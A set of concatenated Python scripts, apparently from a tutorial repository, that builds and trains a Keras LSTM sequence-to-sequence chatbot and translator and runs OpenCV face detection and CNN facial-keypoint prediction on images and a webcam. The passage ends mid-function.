    # dense output layer used to predict each character ( or word )
    # in one-hot manner, not recursively
    decoder_dense = Dense(num_decoder_tokens, activation="softmax")
    decoder_outputs = decoder_dense(decoder_outputs)
    # finally, the model is defined with inputs for the encoder and the decoder
    # and the output target sequence
    # turn encoder_input_data & decoder_input_data into decoder_target_data
    model = Model([encoder_inputs, decoder_inputs], output=decoder_outputs)
    # model.summary()
    # define encoder inference model
    encoder_model = Model(encoder_inputs, encoder_states)
    # define decoder inference model
    decoder_state_input_h = Input(shape=(latent_dim,))
    decoder_state_input_c = Input(shape=(latent_dim,))
    decoder_states_inputs = [decoder_state_input_h, decoder_state_input_c]

    # Get the embeddings of the decoder sequence
    if embedding_layer:
        dec_emb2 = encoder_emb_layer(decoder_inputs)
    else:
        dec_emb2 = decoder_inputs

    decoder_outputs, state_h, state_c = decoder_lstm(dec_emb2, initial_state=decoder_states_inputs)
    decoder_states = [state_h, state_c]
    decoder_outputs = decoder_dense(decoder_outputs)
    decoder_model = Model([decoder_inputs] + decoder_states_inputs, [decoder_outputs] + decoder_states)
    return model, encoder_model, decoder_model
    



def predict_sequence(enc, dec, source, n_steps, cardinality, char_level=False):
    """Generate target given source sequence, this function can be used
    after the model is trained to generate a target sequence given a source sequence."""
    # encode
    state = enc.predict(source)
    # start of sequence input
    if char_level:
        target_seq = np.zeros((1, 1, 61))
    else:
        target_seq = np.zeros((1, 1))
    # collect predictions
    output = []
    for t in range(n_steps):
        # predict next char
        yhat, h, c = dec.predict([target_seq] + state)
        # store predictions
        y = yhat[0, 0, :]
        if char_level:
            sampled_token_index = to_categorical(np.argmax(y), num_classes=61)
        else:
            sampled_token_index = np.argmax(y)
        output.append(sampled_token_index)
        # update state
        state = [h, c]
        # update target sequence
        if char_level:
            target_seq = np.zeros((1, 1, 61))
        else:
            target_seq = np.zeros((1, 1))
        target_seq[0, 0] = sampled_token_index
        
    return np.array(output)


def decode_sequence(enc, dec, input_seq):
    # Encode the input as state vectors.
    states_value = enc.predict(input_seq)
    
    # Generate empty target sequence of length 1.
    target_seq = np.zeros((1,1))
    
    # Populate the first character of target sequence with the start character.
    target_seq[0, 0] = 0
    
    # Sampling loop for a batch of sequences
    # (to simplify, here we assume a batch of size 1).
    stop_condition = False
    decoded_sequence = []
    
    while not stop_condition:
        output_tokens, h, c = dec.predict([target_seq] + states_value)
        # Sample a token
        sampled_token_index = np.argmax(output_tokens[0, -1, :])
        # sampled_char = reverse_target_char_index[sampled_token_index]
        decoded_sentence.append(output_tokens[0, -1, :])
        
        # Exit condition: either hit max length or find stop token.
        if (output_tokens == '<PAD>' or len(decoded_sentence) > 50):
            stop_condition = True
        
        # Update the target sequence (of length 1).
        target_seq = np.zeros((1,1))
        target_seq[0, 0] = sampled_token_index
        
        # Update states
        states_value = [h, c]
    
    return decoded_sentence




from keras.preprocessing.text import Tokenizer
from keras.preprocessing.sequence import pad_sequences
from keras.utils import to_categorical
import numpy as np


def tokenize(x, tokenizer=None):
    """Tokenize x
    :param x: List of sentences/strings to be tokenized
    :return: Tuple of (tokenized x data, tokenizer used to tokenize x)"""
    if tokenizer:
        t = tokenizer
    else:
        t = Tokenizer()
    t.fit_on_texts(x)
    return t.texts_to_sequences(x), t


def pad(x, length=None):
    """Pad x
    :param x: list of sequences
    :param length: Length to pad the sequence to, If None, use length
    of longest sequence in x.
    :return: Padded numpy array of sequences"""
    return pad_sequences(x, maxlen=length, padding="post")


def preprocess(x, y):
    """Preprocess x and y
    :param x: Feature list of sentences
    :param y: Label list of sentences
    :return: Tuple of (preprocessed x, preprocessed y, x tokenizer, y tokenizer)"""
    preprocess_x, x_tk = tokenize(x)
    preprocess_y, y_tk = tokenize(y)
    preprocess_x2 = [ [0] + s for s in preprocess_y ]
    longest_x = max([len(i) for i in preprocess_x])
    longest_y = max([len(i) for i in preprocess_y]) + 1
    # max_length = len(x_tk.word_index) if len(x_tk.word_index) > len(y_tk.word_index) else len(y_tk.word_index)
    max_length = longest_x if longest_x > longest_y else longest_y

    preprocess_x = pad(preprocess_x, length=max_length)
    preprocess_x2 = pad(preprocess_x2, length=max_length)
    preprocess_y = pad(preprocess_y, length=max_length)

    # preprocess_x = to_categorical(preprocess_x)
    # preprocess_x2 = to_categorical(preprocess_x2)
    preprocess_y = to_categorical(preprocess_y)

    return preprocess_x, preprocess_x2, preprocess_y, x_tk, y_tk


def load_data(filename):
    with open(filename) as f:
        text = f.read()
    return text.split("\n")


def load_dataset():
    english_sentences = load_data("data/small_vocab_en")
    french_sentences = load_data("data/small_vocab_fr")
    
    return preprocess(english_sentences, french_sentences)


# def generate_batch(X, y, num_decoder_tokens, max_length_src, max_length_target, batch_size=256):
#     """Generating data"""
#     while True:
#         for j in range(0, len(X), batch_size):
#             encoder_input_data = np.zeros((batch_size, max_length_src), dtype='float32')
#             decoder_input_data = np.zeros((batch_size, max_length_target), dtype='float32')
#             decoder_target_data = np.zeros((batch_size, max_length_target, num_decoder_tokens), dtype='float32')
#             for i, (input_text, target_text) in enumerate(zip(X[j: j+batch_size], y[j: j+batch_size])):
#                 for t, word in enumerate(input_text.split()):
#                     encoder_input_data[i, t] = input_word_index[word] # encoder input sequence
#                 for t, word in enumerate(target_text.split()):
#                     if t > 0:
#                         # offset by one timestep
#                         # one-hot encoded
#                         decoder_target_data[i, t-1, target_token_index[word]] = 1
#                     if t < len(target_text.split()) - 1:
#                         decoder_input_data[i, t] = target_token_index[word]
#             yield ([encoder_input_data, decoder_input_data], decoder_target_data)

if __name__ == "__main__":
    from generator import NMTGenerator
    gen = NMTGenerator(source_file="data/small_vocab_en", target_file="data/small_vocab_fr")
    gen.load_dataset()
    print(gen.num_decoder_tokens)
    print(gen.num_encoder_tokens)
    print(gen.source_sequence_length)
    print(gen.target_sequence_length)
    print(gen.X.shape)
    print(gen.y.shape)
    for i, ((encoder_input_data, decoder_input_data), decoder_target_data) in enumerate(gen.generate_batches()):
        # print("encoder_input_data.shape:", encoder_input_data.shape)
        # print("decoder_output_data.shape:", decoder_input_data.shape)
        if i % (len(gen.X) // gen.batch_size + 1) == 0:
            print(i, ": decoder_input_data:", decoder_input_data[0])




# to use CPU
import os
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,
                        inter_op_parallelism_threads=5, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )

from models import predict_sequence, encoder_decoder_model
from preprocess import tokenize, pad
from keras.utils import to_categorical
from generator import get_embedding_vectors
import pickle
import numpy as np

x_tk = pickle.load(open("results/x_tk.pickle", "rb"))
y_tk = pickle.load(open("results/y_tk.pickle", "rb"))



index_to_words = {id: word for word, id in y_tk.word_index.items()}
index_to_words[0] = '_'

def logits_to_text(logits):
    """
    Turn logits from a neural network into text using the tokenizer
    :param logits: Logits from a neural network
    :param tokenizer: Keras Tokenizer fit on the labels
    :return: String that represents the text of the logits
    """
    # return ' '.join([index_to_words[prediction] for prediction in np.argmax(logits, 1)])
    return ' '.join([index_to_words[prediction] for prediction in logits])


num_encoder_tokens = 29046
num_decoder_tokens = 29046
latent_dim = 300

# embedding_vectors = get_embedding_vectors(x_tk)

model, enc, dec = encoder_decoder_model(num_encoder_tokens, latent_dim, num_decoder_tokens)
enc.summary()
dec.summary()
model.summary()
model.load_weights("results/chatbot_v13_4.831_0.219.h5")

while True:
    text = input("> ")
    tokenized = tokenize([text], tokenizer=y_tk)[0]
    # print("tokenized:", tokenized)
    X = pad(tokenized, length=37)
    sequence = predict_sequence(enc, dec, X, 37, num_decoder_tokens)
    # print(sequence)
    result = logits_to_text(sequence)
    print(result)




# to use CPU
import os
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,
                        inter_op_parallelism_threads=5, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )

from models import predict_sequence, encoder_decoder_model
from preprocess import tokenize, pad
from keras.utils import to_categorical
from generator import get_embedding_vectors
import pickle
import numpy as np

x_tk = pickle.load(open("results/x_tk.pickle", "rb"))
y_tk = pickle.load(open("results/y_tk.pickle", "rb"))



index_to_words = {id: word for word, id in y_tk.word_index.items()}
index_to_words[0] = '_'

def logits_to_text(logits):
    """
    Turn logits from a neural network into text using the tokenizer
    :param logits: Logits from a neural network
    :param tokenizer: Keras Tokenizer fit on the labels
    :return: String that represents the text of the logits
    """
    # return ' '.join([index_to_words[prediction] for prediction in np.argmax(logits, 1)])
    # return ''.join([index_to_words[np.where(prediction==1)[0]] for prediction in logits])
    text = ""
    for prediction in logits:
        char_index = np.where(prediction)[0][0]

        char = index_to_words[char_index]
        text += char
    return text
        


num_encoder_tokens = 61
num_decoder_tokens = 61
latent_dim = 384

# embedding_vectors = get_embedding_vectors(x_tk)

model, enc, dec = encoder_decoder_model(num_encoder_tokens, latent_dim, num_decoder_tokens, embedding_layer=False)
enc.summary()
dec.summary()
model.summary()
model.load_weights("results/chatbot_charlevel_v2_0.32_0.90.h5")

while True:
    text = input("> ")
    tokenized = tokenize([text], tokenizer=y_tk)[0]
    # print("tokenized:", tokenized)
    X = to_categorical(pad(tokenized, length=37), num_classes=num_encoder_tokens)
    # print(X)
    sequence = predict_sequence(enc, dec, X, 206, num_decoder_tokens, char_level=True)
    # print(sequence)
    result = logits_to_text(sequence)
    print(result)




import numpy as np
import pickle
from models import encoder_decoder_model
from generator import NMTGenerator, get_embedding_vectors
from preprocess import load_dataset
from keras.callbacks import ModelCheckpoint
from keras_adabound import AdaBound

text_gen = NMTGenerator(source_file="data/questions",
                        target_file="data/answers",
                        batch_size=32,
                        same_tokenizer=True,
                        verbose=2)
text_gen.load_dataset()
print("[+] Dataset loaded.")

num_encoder_tokens = text_gen.num_encoder_tokens
num_decoder_tokens = text_gen.num_decoder_tokens
# get tokenizer
tokenizer = text_gen.x_tk
embedding_vectors = get_embedding_vectors(tokenizer)
print("text_gen.source_sequence_length:", text_gen.source_sequence_length)
print("text_gen.target_sequence_length:", text_gen.target_sequence_length)
num_tokens = max([num_encoder_tokens, num_decoder_tokens])
latent_dim = 300

model, enc, dec = encoder_decoder_model(num_tokens, latent_dim, num_tokens, embedding_matrix=embedding_vectors)
model.summary()
enc.summary()
dec.summary()
del enc
del dec
print("[+] Models created.")

model.compile(optimizer="rmsprop", loss="categorical_crossentropy", metrics=["accuracy"])
print("[+] Model compiled.")

# pickle.dump(x_tk, open("results/x_tk.pickle", "wb"))
print("[+] X tokenizer serialized.")

# pickle.dump(y_tk, open("results/y_tk.pickle", "wb"))
print("[+] y tokenizer serialized.")

# X = X.reshape((X.shape[0], X.shape[2], X.shape[1]))
# y = y.reshape((y.shape[0], y.shape[2], y.shape[1]))
print("[+] Dataset reshaped.")

# print("X1.shape:", X1.shape)
# print("X2.shape:", X2.shape)
# print("y.shape:", y.shape)
checkpointer = ModelCheckpoint("results/chatbot_v13_{val_loss:.3f}_{val_acc:.3f}.h5", save_best_only=False, verbose=1)
model.load_weights("results/chatbot_v13_4.806_0.219.h5")
# model.fit([X1, X2], y,
model.fit_generator(text_gen.next_train(),
                    validation_data=text_gen.next_validation(),
                    verbose=1,
                    steps_per_epoch=(len(text_gen.X_train) // text_gen.batch_size),
                    validation_steps=(len(text_gen.X_test) // text_gen.batch_size),
                    callbacks=[checkpointer],
                    epochs=5)
print("[+] Model trained.")

model.save_weights("results/chatbot_v13.h5")
print("[+] Model saved.")




import numpy as np
import pickle
from models import encoder_decoder_model
from generator import NMTGenerator, get_embedding_vectors
from preprocess import load_dataset
from keras.callbacks import ModelCheckpoint
from keras_adabound import AdaBound

text_gen = NMTGenerator(source_file="data/questions",
                        target_file="data/answers",
                        batch_size=256,
                        same_tokenizer=True,
                        char_level=True,
                        verbose=2)
text_gen.load_dataset()
print("[+] Dataset loaded.")

num_encoder_tokens = text_gen.num_encoder_tokens
num_decoder_tokens = text_gen.num_decoder_tokens
# get tokenizer
tokenizer = text_gen.x_tk
print("text_gen.source_sequence_length:", text_gen.source_sequence_length)
print("text_gen.target_sequence_length:", text_gen.target_sequence_length)
num_tokens = max([num_encoder_tokens, num_decoder_tokens])
latent_dim = 384

model, enc, dec = encoder_decoder_model(num_tokens, latent_dim, num_tokens, embedding_layer=False)
model.summary()
enc.summary()
dec.summary()
del enc
del dec
print("[+] Models created.")

model.compile(optimizer=AdaBound(lr=1e-3, final_lr=0.1), loss="categorical_crossentropy", metrics=["accuracy"])
print("[+] Model compiled.")

# pickle.dump(x_tk, open("results/x_tk.pickle", "wb"))
print("[+] X tokenizer serialized.")

# pickle.dump(y_tk, open("results/y_tk.pickle", "wb"))
print("[+] y tokenizer serialized.")

# X = X.reshape((X.shape[0], X.shape[2], X.shape[1]))
# y = y.reshape((y.shape[0], y.shape[2], y.shape[1]))
print("[+] Dataset reshaped.")

# print("X1.shape:", X1.shape)
# print("X2.shape:", X2.shape)
# print("y.shape:", y.shape)
checkpointer = ModelCheckpoint("results/chatbot_charlevel_v2_{val_loss:.2f}_{val_acc:.2f}.h5", save_best_only=False, verbose=1)
model.load_weights("results/chatbot_charlevel_v2_0.32_0.90.h5")
# model.fit([X1, X2], y,
model.fit_generator(text_gen.next_train(),
                    validation_data=text_gen.next_validation(),
                    verbose=1,
                    steps_per_epoch=(len(text_gen.X_train) // text_gen.batch_size)+1,
                    validation_steps=(len(text_gen.X_test) // text_gen.batch_size)+1,
                    callbacks=[checkpointer],
                    epochs=50)
print("[+] Model trained.")

model.save_weights("results/chatbot_charlevel_v2.h5")
print("[+] Model saved.")




import tqdm

X, y = [], []
with open("data/fr-en", encoding='utf8') as f:
    for i, line in tqdm.tqdm(enumerate(f), "Reading file"):
        if "europarl-v7" in line:
            continue
        # X.append(line)
        # if i == 2007723 or i == 2007724 or i == 2007725
        if i <= 2007722:
            X.append(line.strip())
        else:
            y.append(line.strip())

y.pop(-1)


with open("data/en", "w", encoding='utf8') as f:
    for i in tqdm.tqdm(X, "Writing english"):
        print(i, file=f)

with open("data/fr", "w", encoding='utf8') as f:
    for i in tqdm.tqdm(y, "Writing french"):
        print(i, file=f)




import glob
import tqdm
import os
import random
import inflect

p = inflect.engine()

X, y = [], []

special_words = {
    "haha", "rockikz", "fullclip", "xanthoss", "aw", "wow", "ah", "oh", "god", "quran", "allah",
    "muslims", "muslim", "islam", "?", ".", ",",
    '_func_val_get_callme_para1_comma0', '_num2_', '_func_val_get_last_question', '_num1_',
    '_func_val_get_number_plus_para1__num1__para2__num2_',
    '_func_val_update_call_me_enforced_para1__callme_',
    '_func_val_get_number_minus_para1__num2__para2__num1_', '_func_val_get_weekday_para1_d0',
    '_func_val_update_user_name_para1__name_', '_callme_', '_func_val_execute_pending_action_and_reply_para1_no',
    '_func_val_clear_user_name_and_call_me', '_func_val_get_story_name_para1_the_velveteen_rabbit', '_ignored_',
    '_func_val_get_number_divide_para1__num1__para2__num2_', '_func_val_get_joke_anyQ:',
    '_func_val_update_user_name_and_call_me_para1__name__para2__callme_', '_func_val_get_number_divide_para1__num2__para2__num1_Q:',
    '_name_', '_func_val_ask_name_if_not_yet', '_func_val_get_last_answer', '_func_val_continue_last_topic',
    '_func_val_get_weekday_para1_d1', '_func_val_get_number_minus_para1__num1__para2__num2_', '_func_val_get_joke_any',
    '_func_val_get_story_name_para1_the_three_little_pigs', '_func_val_update_call_me_para1__callme_',
    '_func_val_get_story_name_para1_snow_white', '_func_val_get_today', '_func_val_get_number_multiply_para1__num1__para2__num2_',
    '_func_val_update_user_name_enforced_para1__name_', '_func_val_get_weekday_para1_d_2', '_func_val_correct_user_name_para1__name_',
    '_func_val_get_time', '_func_val_get_number_divide_para1__num2__para2__num1_', '_func_val_get_story_any',
    '_func_val_execute_pending_action_and_reply_para1_yes', '_func_val_get_weekday_para1_d_1', '_func_val_get_weekday_para1_d2'
}

english_words = { word.strip() for word in open("data/words8.txt") }

embedding_words = set()
f = open("data/glove.6B.300d.txt", encoding='utf8')
for line in tqdm.tqdm(f, "Reading GloVe words"):
    values = line.split()
    word = values[0]
    embedding_words.add(word)

maps = open("data/maps.txt").readlines()
word_mapper = {}
for map in maps:
    key, value = map.split("=>")
    key = key.strip()
    value = value.strip()
    print(f"Mapping {key} to {value}")
    word_mapper[key.lower()] = value


unks = 0
digits = 0
mapped = 0
english = 0
special = 0

def map_text(line):
    global unks
    global digits
    global mapped
    global english
    global special
    result = []
    append = result.append
    words = line.split()
    for word in words:
        word = word.lower()
        if word.isdigit():
            append(p.number_to_words(word))
            digits += 1
            continue
        if word in word_mapper:
            append(word_mapper[word])
            mapped += 1
            continue
        if word in english_words:
            append(word)
            english += 1
            continue
        if word in special_words:
            append(word)
            special += 1
            continue
        append("_unk_")
        unks += 1
    return ' '.join(result)

for file in tqdm.tqdm(glob.glob("data/Augment*/*"), "Reading files"):
    with open(file, encoding='utf8') as f:
        for line in f:
            line = line.strip()
            if "Q: " in line:
                X.append(line)
            elif "A: " in line:
                y.append(line)

# shuffle X and y maintaining the order
combined = list(zip(X, y))
random.shuffle(combined)

X[:], y[:] = zip(*combined)

with open("data/questions", "w") as f:
    for line in tqdm.tqdm(X, "Writing questions"):
        line = line.strip().lstrip('Q: ')
        line = map_text(line)
        print(line, file=f)

print()

print("[!] Unks:", unks)
print("[!] digits:", digits)
print("[!] Mapped:", mapped)
print("[!] english:", english)
print("[!] special:", special)
print()

unks = 0
digits = 0
mapped = 0
english = 0
special = 0

with open("data/answers", "w") as f:
    for line in tqdm.tqdm(y, "Writing answers"):
        line = line.strip().lstrip('A: ')
        line = map_text(line)
        print(line, file=f)

print()
print("[!] Unks:", unks)
print("[!] digits:", digits)
print("[!] Mapped:", mapped)
print("[!] english:", english)
print("[!] special:", special)
print()




import numpy as np
import cv2


# loading the test image
image = cv2.imread("kids.jpg")

# converting to grayscale
image_gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)

# initialize the face recognizer (default face haar cascade)
face_cascade = cv2.CascadeClassifier("cascades/haarcascade_fontalface_default.xml")

# detect all the faces in the image
faces = face_cascade.detectMultiScale(image_gray, 1.3, 5)

# for every face, draw a blue rectangle
for x, y, width, height in faces:
    cv2.rectangle(image, (x, y), (x + width, y + height), color=(255, 0, 0), thickness=2)

# save the image with rectangles
cv2.imwrite("kids_detected.jpg", image)




import numpy as np
import cv2

# create a new cam object
cap = cv2.VideoCapture(0)

# initialize the face recognizer (default face haar cascade)
face_cascade = cv2.CascadeClassifier("cascades/haarcascade_fontalface_default.xml")

while True:
    # read the image from the cam
    _, image = cap.read()
    # converting to grayscale
    image_gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)

    # detect all the faces in the image
    faces = face_cascade.detectMultiScale(image_gray, 1.3, 5)

    # for every face, draw a blue rectangle
    for x, y, width, height in faces:
        cv2.rectangle(image, (x, y), (x + width, y + height), color=(255, 0, 0), thickness=2)

    cv2.imshow("image", image)

    if cv2.waitKey(1) == ord("q"):
        break

cap.release()
cv2.destroyAllWindows()




import cv2
import numpy as np
import matplotlib.pyplot as plt

import sys

from models import create_model
from parameters import *
from utils import normalize_image


def untransform(keypoints):
    return keypoints * 50 + 100


def get_single_prediction(model, image):
    image = np.expand_dims(image, axis=0)
    keypoints = model.predict(image)[0]
    return keypoints.reshape(*OUTPUT_SHAPE)


def show_keypoints(image, predicted_keypoints, true_keypoints=None):
    predicted_keypoints = untransform(predicted_keypoints)        
    plt.imshow(np.squeeze(image), cmap="gray")
    plt.scatter(predicted_keypoints[:, 0], predicted_keypoints[:, 1], s=20, marker=".", c="m")
    if true_keypoints is not None:
        true_keypoints = untransform(true_keypoints)
        plt.scatter(true_keypoints[:, 0], true_keypoints[:, 1], s=20, marker=".", c="g")
    plt.show()


image = cv2.imread(sys.argv[1])
image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)

# # construct the model
model = create_model((*IMAGE_SIZE, 1), OUTPUT_SHAPE[0] * OUTPUT_SHAPE[1])

model.load_weights("results/model_smoothl1.h5")

face_cascade = cv2.CascadeClassifier("haarcascade_frontalface_default.xml")
# get all the faces in the image
faces = face_cascade.detectMultiScale(image, 1.2, 2)

for (x, y, w, h) in faces:
    cv2.rectangle(image, (x, y), (x+w, y+h), (255, 0, 0), 3)
    face_image = image.copy()[y: y+h, x: x+w]
    face_image = normalize_image(face_image)
    keypoints = get_single_prediction(model, face_image)
    show_keypoints(face_image, keypoints)




import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import cv2

from models import create_model
from parameters import IMAGE_SIZE, BATCH_SIZE, EPOCHS, OUTPUT_SHAPE, training_file, testing_file
from utils import load_data, resize_image, normalize_keypoints, normalize_image


def get_single_prediction(model, image):
    image = np.expand_dims(image, axis=0)
    keypoints = model.predict(image)[0]
    return keypoints.reshape(*OUTPUT_SHAPE)

def get_predictions(model, X):
    predicted_keypoints = model.predict(X)
    predicted_keypoints = predicted_keypoints.reshape(-1, *OUTPUT_SHAPE)
    return predicted_keypoints
    

def show_keypoints(image, predicted_keypoints, true_keypoints=None):
    predicted_keypoints = untransform(predicted_keypoints)        
    plt.imshow(image, cmap="gray")
    plt.scatter(predicted_keypoints[:, 0], predicted_keypoints[:, 1], s=20, marker=".", c="m")
    if true_keypoints is not None:
        true_keypoints = untransform(true_keypoints)
        plt.scatter(true_keypoints[:, 0], true_keypoints[:, 1], s=20, marker=".", c="g")
    plt.show()


def show_keypoints_cv2(image, predicted_keypoints, true_keypoints=None):
    for keypoint in predicted_keypoints:
        image = cv2.circle(image, (keypoint[0], keypoint[1]), 2, color=2)
    if true_keypoints is not None:
        image = cv2.circle(image, (true_keypoints[:, 0], true_keypoints[:, 1]), 2, color="green")
    return image


def untransform(keypoints):
    return keypoints * 224


# construct the model
model = create_model((*IMAGE_SIZE, 1), OUTPUT_SHAPE[0] * OUTPUT_SHAPE[1])

model.load_weights("results/model_smoothl1_different-scaling.h5")

# X_test, y_test = load_data(testing_file)
# y_test = y_test.reshape(-1, *OUTPUT_SHAPE)

cap = cv2.VideoCapture(0)

while True:
    _, frame = cap.read()
    # make a copy of the original image
    image = frame.copy()
    image = normalize_image(image)

    keypoints = get_single_prediction(model, image)
    print(keypoints[0])
    keypoints = untransform(keypoints)
    # w, h = frame.shape[:2]
    # keypoints = (keypoints * [frame.shape[0] / image.shape[0], frame.shape[1] / image.shape[1]]).astype("int16")
    # frame = show_keypoints_cv2(frame, keypoints)
    image = show_keypoints_cv2(image, keypoints)
    cv2.imshow("frame", image)

    if cv2.waitKey(1) == ord("q"):
        break

cv2.destroyAllWindows()
cap.release()




from tensorflow.keras.models import Sequential, Model
from tensorflow.keras.layers import Dense, Activation, Conv2D, MaxPooling2D, Dropout, Flatten
from tensorflow.keras.applications import MobileNetV2
import tensorflow as tf
import tensorflow.keras.backend as K

def smoothL1(y_true, y_pred):
    HUBER_DELTA = 0.5
    x   = K.abs(y_true - y_pred)
    x   = K.switch(x < HUBER_DELTA, 0.5 * x ** 2, HUBER_DELTA * (x - 0.5 * HUBER_DELTA))
    return K.sum(x)


def create_model(input_shape, output_shape):

    # building the model
    model = Sequential()

    model.add(Conv2D(filters=32, kernel_size=(5, 5), padding="same", input_shape=input_shape))
    model.add(Activation("relu"))
    model.add(Conv2D(filters=32, kernel_size=(5, 5), padding="same"))
    model.add(Activation("relu"))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    # model.add(Dropout(0.25))

    model.add(Conv2D(filters=64, kernel_size=(5, 5), padding="same"))
    model.add(Activation("relu"))
    model.add(Conv2D(filters=64, kernel_size=(5, 5), padding="same"))
    model.add(Activation("relu"))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    # model.add(Dropout(0.25))

    model.add(Conv2D(filters=128, kernel_size=(5, 5), padding="same"))
    model.add(Activation("relu"))
    model.add(Conv2D(filters=128, kernel_size=(5, 5), padding="same"))
    model.add(Activation("relu"))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    # model.add(Dropout(0.25))

    # model.add(Conv2D(filters=256, kernel_size=(5, 5), padding="same"))
    # model.add(Activation("relu"))
    # model.add(Conv2D(filters=256, kernel_size=(5, 5), padding="same"))
    # model.add(Activation("relu"))
    # model.add(MaxPooling2D(pool_size=(2, 2)))
    # # model.add(Dropout(0.25))

    # flattening the convolutions
    model.add(Flatten())
    # fully-connected layers
    model.add(Dense(256))
    model.add(Activation("relu"))
    model.add(Dropout(0.5))
    model.add(Dense(output_shape, activation="linear"))

    # print the summary of the model architecture
    model.summary()

    # training the model using rmsprop optimizer
    # model.compile(loss="mean_squared_error", optimizer="adam", metrics=["mean_absolute_error"])
    model.compile(loss=smoothL1, optimizer="adam", metrics=["mean_absolute_error"])
    return model


def create_mobilenet_model(input_shape, output_shape):
    model = MobileNetV2(input_shape=input_shape)
    # remove the last layer
    model.layers.pop()
    # freeze all the weights of the model except for the last 4 layers
    for layer in model.layers[:-4]:
        layer.trainable = False
    # construct our output dense layer
    output = Dense(output_shape, activation="linear")
    # connect it to the model
    output = output(model.layers[-1].output)

    model = Model(inputs=model.inputs, outputs=output)

    model.summary()

    # training the model using adam optimizer
    # model.compile(loss="mean_squared_error", optimizer="adam", metrics=["mean_absolute_error"])
    model.compile(loss=smoothL1, optimizer="adam", metrics=["mean_absolute_error"])
    return model




IMAGE_SIZE = (224, 224)
OUTPUT_SHAPE = (68, 2)
BATCH_SIZE = 20
EPOCHS = 30

training_file = "data/training_frames_keypoints.csv"
testing_file = "data/test_frames_keypoints.csv"




import pandas as pd
import numpy as np
import matplotlib.pyplot as plt

from models import create_model, create_mobilenet_model
from parameters import IMAGE_SIZE, BATCH_SIZE, EPOCHS, OUTPUT_SHAPE, training_file, testing_file
from utils import load_data


def get_predictions(model, X):
    predicted_keypoints = model.predict(X)
    predicted_keypoints = predicted_keypoints.reshape(-1, *OUTPUT_SHAPE)
    return predicted_keypoints
    

def show_keypoints(image, predicted_keypoints, true_keypoints):
    predicted_keypoints = untransform(predicted_keypoints)
    true_keypoints = untransform(true_keypoints)
    plt.imshow(np.squeeze(image), cmap="gray")
    plt.scatter(predicted_keypoints[:, 0], predicted_keypoints[:, 1], s=20, marker=".", c="m")
    plt.scatter(true_keypoints[:, 0], true_keypoints[:, 1], s=20, marker=".", c="g")
    plt.show()


def untransform(keypoints):
    return keypoints *224


# # construct the model
model = create_mobilenet_model((*IMAGE_SIZE, 3), OUTPUT_SHAPE[0] * OUTPUT_SHAPE[1])

model.load_weights("results/model_smoothl1_mobilenet_crop.h5")

X_test, y_test = load_data(testing_file)
y_test = y_test.reshape(-1, *OUTPUT_SHAPE)

y_pred = get_predictions(model, X_test)
print(y_pred[0])
print(y_pred.shape)
print(y_test.shape)
print(X_test.shape)

for i in range(50):
    show_keypoints(X_test[i+400], y_pred[i+400], y_test[i+400])




import numpy as np
import pandas as pd
import matplotlib.pyplot as plt

from sklearn.preprocessing import MinMaxScaler
from tqdm import tqdm
# from tensorflow.keras.layers import Conv2D, Dense, MaxPooling2D
from tensorflow.keras.callbacks import TensorBoard, ModelCheckpoint


import os

from models import create_model, create_mobilenet_model
from parameters import IMAGE_SIZE, BATCH_SIZE, EPOCHS, OUTPUT_SHAPE, training_file, testing_file
from utils import load_data

# # read the training dataframe
# training_df = pd.read_csv("data/training_frames_keypoints.csv")

# # print the number of images available in the training dataset
# print("Number of images in training set:", training_df.shape[0])

def show_keypoints(image, key_points):
    # show the image
    plt.imshow(image)
    # use scatter() to plot the keypoints in the faces
    plt.scatter(key_points[:, 0], key_points[:, 1], s=20, marker=".")
    plt.show()

# show an example image
# n = 124
# image_name = training_df.iloc[n, 0]
# keypoints = training_df.iloc[n, 1:].values.reshape(-1, 2)
# show_keypoints(mpimg.imread(os.path.join("data", "training", image_name)), key_points=keypoints)

model_name = "model_smoothl1_mobilenet_crop"

# construct the model
model = create_mobilenet_model((*IMAGE_SIZE, 3), OUTPUT_SHAPE[0] * OUTPUT_SHAPE[1])

# model.load_weights("results/model3.h5")

X_train, y_train = load_data(training_file, to_gray=False)
X_test, y_test = load_data(testing_file, to_gray=False)

if not os.path.isdir("results"):
    os.mkdir("results")

tensorboard = TensorBoard(log_dir=os.path.join("logs", model_name))
# checkpoint = ModelCheckpoint(os.path.join("results", model_name), save_best_only=True, verbose=1)

history = model.fit(X_train, y_train,
                    batch_size=BATCH_SIZE,
                    epochs=EPOCHS,
                    validation_data=(X_test, y_test),
                    # callbacks=[tensorboard, checkpoint],
                    callbacks=[tensorboard],
                    verbose=1)


model.save("results/" + model_name + ".h5")




import numpy as np
import pandas as pd
import matplotlib.image as mpimg
import matplotlib.pyplot as plt
import cv2
from tqdm import tqdm


import os

from parameters import IMAGE_SIZE, OUTPUT_SHAPE


def show_keypoints(image, predicted_keypoints, true_keypoints=None):
    # predicted_keypoints = untransform(predicted_keypoints)        
    plt.imshow(image, cmap="gray")
    plt.scatter(predicted_keypoints[:, 0], predicted_keypoints[:, 1], s=20, marker=".", c="m")
    if true_keypoints is not None:
        # true_keypoints = untransform(true_keypoints)
        plt.scatter(true_keypoints[:, 0], true_keypoints[:, 1], s=20, marker=".", c="g")
    plt.show()


def resize_image(image, image_size):
    return cv2.resize(image, image_size)


def random_crop(image, keypoints):
    h, w = image.shape[:2]
    new_h, new_w = IMAGE_SIZE
    keypoints = keypoints.reshape(-1, 2)
    try:
        top = np.random.randint(0, h - new_h)
        left = np.random.randint(0, w - new_w)
    except ValueError:
        return image, keypoints
    image = image[top: top + new_h, left: left + new_w]
    keypoints = keypoints - [left, top]
    
    return image, keypoints


def normalize_image(image, to_gray=True):
